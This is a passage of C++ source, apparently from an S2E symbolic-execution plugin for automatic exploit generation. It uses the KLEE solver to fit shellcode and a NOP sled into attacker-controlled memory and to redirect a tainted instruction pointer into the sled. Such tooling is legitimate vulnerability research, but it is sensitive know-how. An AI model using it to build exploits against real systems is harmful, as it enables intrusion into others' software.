      char *p = strtok(c_shellcode, "x");

      while(p != NULL)
      {
	code.push_back(strtol(p, NULL, 16));
	//s2e()->getWarningsStream(state) << strtol(p, NULL, 16) << std::endl;
	p = strtok(NULL, "x");
      }


      return code;
    }

    int Exploit::testShellcode(S2EExecutionState *state, uint32_t address, std::vector<unsigned char> shellcode, klee::ConstraintManager cm, klee::ref<klee::Expr> tainted_ptr, uint32_t tainted_value ,uint32_t nop_end, unsigned char nop_value)
    {
      int size = shellcode.size();
      int i;


      //s2e()->getWarningsStream(state) << "address: " << address << std::endl;
      //klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( eip_value, klee::ConstantExpr::alloc(0xffffffff ,klee::Expr::Int32));
      //bool res;                             
      //klee::Solver::Validity res;                             
      //klee::Query query(cm, one_byte);        
      //s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

      //s2e()->getMessagesStream(state) << "res : " << res << std::endl;

      klee::ref<klee::Expr> all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);

      for(i=0 ; i<size ; i++)
      {
	klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( state->readMemory8(address + i), klee::ConstantExpr::create(shellcode[i] ,klee::Expr::Int8));


	all = klee::AndExpr::create(all, one_byte);
	//s2e()->getMessagesStream(state) << state->readMemory8(address + i) << std::endl;
	//  state->addConstraint(one_byte);

	//bool res;
	//klee::Solver::Validity res;
	//klee::Query query(cm, one_byte);
	//s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);
	//s2e()->getExecutor()->getSolver()->evaluate(query, res);

	//	if(res == false)
	//if(res == klee::Solver::False)
	//	{
	//return false;
	//	  s2e()->getDebugStream(state) << "insert shellcode error! " << one_byte << std::endl;
	//	  return -1;
	//	}
	//	else
	//	{
	//cm.concolicSize = 0;
	/*           std::vector< klee::ref<klee::Expr> >::const_iterator it = state->constraints.begin(); 
		     for(; it != state->constraints.end() ;it++)                               
		     {                                                                         
		     s2e()->getWarningsStream(state) << "constraint : " << *it << std::endl; 
		     }*/                                                                         
	//s2e()->getDebugStream(state) << "insert shellcode ok! " << one_byte << std::endl;
	//	  cm.addConstraint(one_byte);
	//	}
      }

      bool res;
      klee::Query query(cm, all/*klee::ConstantExpr::create(0x1,klee::Expr::Bool)*/);
      s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

      //cm.addConstraint(all);
    /* 
	 std::vector< klee::ref<klee::Expr> >::const_iterator it = cm.begin(); 
	 for(; it != cm.end() ;it++)                               
	 {                                                                         
	 s2e()->getWarningsStream(state) << "constraint : " << *it << std::endl; 
	 }                                                                         
       

      s2e()->getWarningsStream(state) << "all: " << all << std::endl;
    */

      if(res == true)
      {
       if(type==3)
         return 0;

	cm.addConstraint(all);

	if( !testPointer(state, cm,  tainted_ptr, address))
	  return -1;
      }
      else
	return -1;

      return  testAndGetNopSize(state, cm, address, nop_end, nop_value, tainted_ptr, tainted_value);

      //return nop_size;
      /*
	 if(tainted_ptr.compare(eip_value))
	 {
	 s2e()->getMessagesStream(state) << "tainted_ptr != eip_value" << std::endl;

	 klee::ref<klee::Expr> new_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::create(tainted_address ,klee::Expr::Int32));
	 klee::Solver::Validity res;
	 klee::Query query(cm, new_eip);
	 s2e()->getExecutor()->getSolver()->evaluate(query, res); 

	 if(res == klee::Solver::False)
	 return -1;
	 else
	 cm.addConstraint(new_eip);

	 }
       */
      //if(testPointer(state, cm,  tainted_ptr, address - (nop_size/2)))
      //  return nop_size;
      // else
      //   return -1;

      //klee::ref<klee::Expr> new_tainted_ptr =  klee::EqExpr::create( tainted_ptr, klee::ConstantExpr::create(address ,klee::Expr::Int32));
      //s2e()->getMessagesStream(state) << eip_value << std::endl;
      //bool res;
      //klee::Solver::Validity res;
      //klee::Query query(cm, new_tainted_ptr);
      //s2e()->getExecutor()->getSolver()->mayBeFalse(query, res);
      //s2e()->getExecutor()->getSolver()->evaluate(query, res);
      //s2e()->getMessagesStream(state) << "res : " << res << std::endl;


      //return res != klee::Solver::False;
      //return res != true;
    }

    bool Exploit::testPointer(S2EExecutionState *state, klee::ConstraintManager cm,  klee::ref<klee::Expr> target_ptr, uint32_t value)
    {
      /*
	 klee::ref<klee::Expr> right, left;

      //right = value;
      //while(value.get()->getKind() == klee::Expr::Concat)
      // {
      left = dyn_cast<klee::ConcatExpr>(value)->getLeft();
      right = dyn_cast<klee::ConcatExpr>(value)->getRight();
      s2e()->getWarningsStream(state) << left->getKind() << std::endl;

      if(left->getKind() == klee::Expr::Constant)
      return false;

      left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
      right = dyn_cast<klee::ConcatExpr>(right)->getRight();
      s2e()->getWarningsStream(state) << left->getKind() << std::endl;

      left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
      right = dyn_cast<klee::ConcatExpr>(right)->getRight();
      s2e()->getWarningsStream(state) << left->getKind() << std::endl;

      //left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
      //right = dyn_cast<klee::ConcatExpr>(right)->getRight();
      s2e()->getWarningsStream(state) << right->getKind() << std::endl;
      //break;
      //}

       */
      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(target_ptr, klee::ConstantExpr::create(value ,klee::Expr::Int32));

      if(target_ptr.compare(eip_value))
      {
	//s2e()->getMessagesStream(state) << "tainted_ptr != eip_value" << std::endl;
	klee::ref<klee::Expr> temp = klee::EqExpr::create(eip_value, klee::ConstantExpr::create(tainted_address ,klee::Expr::Int32));
	new_eip = klee::AndExpr::create(new_eip, temp);
      }
      bool res;
      //klee::Solver::Validity res;                             
      klee::Query query(cm, new_eip);        
      //s2e()->getExecutor()->getSolver()->evaluate(query, res);
      s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

      s2e()->getDebugStream(state) << "[*] test pointer ? " << res << " " << target_ptr << " = " << std::hex << value << std::endl;

      return res != false/*klee::Solver::False*/;                          


    }

    int Exploit::testAndGetNopSize(S2EExecutionState *state, klee::ConstraintManager cm, uint32_t start, uint32_t end, unsigned char nop_value, klee::ref<klee::Expr> tainted_ptr, uint32_t tainted_value)
    {
      uint32_t min = end;
      uint32_t max = start - 1;
      uint32_t mid = min + (max-min)/2;

      klee::ref<klee::Expr> all;
      while(min <= max)
      {
	all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);
	for(uint32_t address = start-1 ; address >= (mid = (max - (max-min)/2))/*mid*/ ; address--)
	{
	  klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
	  all = klee::AndExpr::create(all, nop);
	}
	bool res;
	klee::Query query(cm, all);
	s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

	//s2e()->getMessagesStream(state) << "test nop: " << std::hex << max << " ~ " << mid << " ~ " << min << " res: " << res << " all: " << all << std::endl;

	if(res == true)
	{
	  max = mid - 1;
	}
	else
	{
	  min = mid + 1;
	}
      }     

      //s2e()->getMessagesStream(state) << "min: " << std::hex << min << " num: " << start-min << std::endl;
      int num = start - min; 
      cm.addConstraint(all);
      //std::vector< klee::ref<klee::Expr> >::const_iterator it = cm.begin();    
      //for(; it != cm.end() ;it++)                                              
      //{                                                                        
      //  s2e()->getWarningsStream(state) << "constraint : " << *it << std::endl;
      //}                                                                        

      //Nop
      //uint32_t nop_address;
      //      uint32_t address;
      //      int num = 0;
      //      for( address = start - 1; address >= end ; address--)
      //      {
      //	klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
      //klee::Solver::Validity res;      
      //        bool res;          
      //	klee::Query query(cm, nop);
      //s2e()->getExecutor()->getSolver()->evaluate(query, res);
      //	s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);
      //s2e()->getMessagesStream(state) << "nop: " << std::hex << start << " res: " << res <<std::endl;

      //	if(res != false/*klee::Solver::False*/)
      //	{
      //state->addConstraint(nop);
      //cm.concolicSize = 0;
      //	  cm.addConstraint(nop);
      //    if(testPointer(state, cm,  tainted_ptr, start - ((num+1)/2)))
      //	  num++;
      //    else
      //      break;
      //	}
      //	else
      //	  break;
      //      } 

      //address = address + 1;

      while(num >= 0)
      {
	if(testPointer(state, cm,  tainted_ptr, /*start*/ tainted_value - (num/2)))
	  break;
	else
	{
	  if(num>0)
	    cm.pop_back();

	  num--;
	}
      }

      return num;

    }

    void Exploit::addConstraints(S2EExecutionState *state, uint32_t address, std::vector<unsigned char> shellcode, klee::ref<klee::Expr> tainted_ptr,uint32_t tainted_value, unsigned char nop_value, int nop_size)
    {
      //unsigned int i;
      klee::ref<klee::Expr> all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);

      for(unsigned int i=0 ; i<shellcode.size(); i++)
      {
	klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( state->readMemory8(address + i), klee::ConstantExpr::create(shellcode[i] ,klee::Expr::Int8));
	all = klee::AndExpr::create(all, one_byte);;
	//state->addConstraint(one_byte);
      }
      for(unsigned int i=0 ; i< (unsigned)nop_size ; i++)
      {
	klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address - i - 1), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
	all = klee::AndExpr::create(all, nop);
	//state->addConstraint(nop);
      }
      //        s2e()->getWarningsStream(state) << "oh~ my~ god~" << std::endl;        

      //    if(0)
      if(tainted_ptr.compare(eip_value))
      {
	//s2e()->getWarningsStream(state) << "tainted_ptr != eip_value" << std::endl;        
	klee::ref<klee::Expr> new_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::create(tainted_address, klee::Expr::Int32));
	all = klee::AndExpr::create(all, new_eip);
	//state->addConstraint(new_eip);

      }

      klee::ref<klee::Expr> new_tainted_ptr =  klee::EqExpr::create( tainted_ptr, klee::ConstantExpr::create(/*address*/tainted_value  - (nop_size/2),klee::Expr::Int32));
      //state->addConstraint(new_tainted_ptr);
      all = klee::AndExpr::create(all, new_tainted_ptr);

      state->addConstraint(all);

    }

    int Exploit::getMaxNopAndAddr(S2EExecutionState *state, std::vector<unsigned char> shellCodeVector, std::vector<std::pair<uint32_t,uint32_t> > sym_table, klee::ref<klee::Expr> tainted_ptr, unsigned char nop_value, const char where[], uint32_t *address)
    {
      *address = 0;
      int nop_size = -1;
      /*
	 for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
	 {
	 for(uint32_t i=it->first ; i < i+it->second ; i++)
	 {
	 if(!eip_value.compare(state->readMemory(i), klee::Expr::Int32))
	 s2e()->getMessagesStream(state) << "eip---> " << std::hex << i << std::endl;
	 }
	 }
       */
      for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)                                
      {                                                                                                                                               
	if(it->second >= shellCodeVector.size())                                                                                                      
	{                                                                                                                                             
	  //s2e()->getMessagesStream(state) << where <<" : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << std::endl;

	  uint32_t shell_start_address = it->first + it->second - shellCodeVector.size();                                                                  

	  while(shell_start_address >= it->first)                                                                                                          
	  {                                                                                                                                     
	    int temp = testShellcode(state, shell_start_address , shellCodeVector, state->constraints, tainted_ptr, shell_start_address, it->first, nop_value);     
//s2e()->getMessagesStream(state) << "shell_start_address: " << shell_start_address << " temp: " << temp << std::endl;
	    if(-1 != temp)                                                 
	    {                                                                                                                                         
	      //s2e()->getMessagesStream(state) << "YYYYYYYYYYYYYYYYYYYYYYYYYYYAAAAAAAAAAAAAAAAAAAA!!! " << std::hex  << shell_address << std::endl;  
	      //int temp;
	      if(nop_size < temp)                                                                    
	      {                                                                                                                                       
		*address = shell_start_address;                                                                                                      
		nop_size = temp;//getNopSize(state, shell_start_address, it->first);                                       
	      }                                                                                                                                       
	      break;                                                                                                                                  
	    }                                                                                                                                         
	    shell_start_address--;                                                                                                                         
	  }                                                                                                                                         
	  //s2e()->getMessagesStream(state) << where <<" : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << " ... nop size: "<< nop_size << std::endl;
	}                                                                                                                                             
	else                                                                                                                                          
	  break;                                                                                                                                      
      } 

      if(nop_size != -1)     
	s2e()->getWarningsStream(state) << "[*] ---> Address: " << std::hex <<  *address << " (" << where << ") nopsize: "<< std::dec << nop_size << std::endl;

      return nop_size;                                                                                                                                     
    }

    void Exploit::getDataSeg(S2EExecutionState *state, uint32_t *start, uint32_t *size)
    {
      uint32_t offset = expr2uint32(state->readMemory(0x804801c, klee::Expr::Int32));                             
      //uint32_t offset = CE->getZExtValue();                                                                     
      //s2e()->getDebugStream(state) << "offset : " << std::hex  <<offset << std::endl;                             

      offset = offset + 0x8048000;                                                                                

      int num = 0;                                                                                                

      while(0x1 != expr2uint32(state->readMemory(offset, klee::Expr::Int32))                                      
	  || 0x8048000 == expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32)))// && offset <= 0x8048100)
	  {                                                                                                       
	    if(0x1 == expr2uint32(state->readMemory(offset, klee::Expr::Int32)))                                  
	      num = 1;                                                                                            
	    offset = offset + 0x20;                                                                               
	  }                                                                                                       

      *start = expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32));                             
      *size = expr2uint32(state->readMemory(offset+0x14, klee::Expr::Int32));                             

    }

  } // namespace plugins
} // namespace s2e
